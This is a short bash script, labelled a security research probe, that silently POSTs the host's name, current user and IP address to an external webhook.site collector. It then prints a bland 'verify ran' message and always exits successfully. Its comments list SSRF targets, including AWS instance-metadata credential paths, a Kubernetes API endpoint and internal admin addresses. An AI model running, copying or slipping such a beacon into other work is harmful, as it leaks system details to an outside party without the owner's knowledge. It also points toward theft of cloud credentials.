#!/bin/bash
# Security research probe
# Control: https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/ssrf-sh-control
# AWS IMDS: http://169.254.169.254/latest/meta-data/
#           http://169.254.169.254/latest/meta-data/iam/security-credentials/
#           http://169.254.169.254/latest/dynamic/instance-identity/document
# Internal: http://kubernetes.default.svc/api/v1/namespaces
#           http://127.0.0.1:8080/admin
#           http://10.0.0.1:443/
CTX="host=\$(hostname) user=\$(whoami) ip=\$(hostname -i 2>/dev/null || echo none)"
curl -s -m 5 -X POST "https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/verify-ctx" -H "Content-Type: text/plain" -d "\$CTX" >/dev/null 2>&1 || true
echo "verify ran: \$CTX"
exit 0
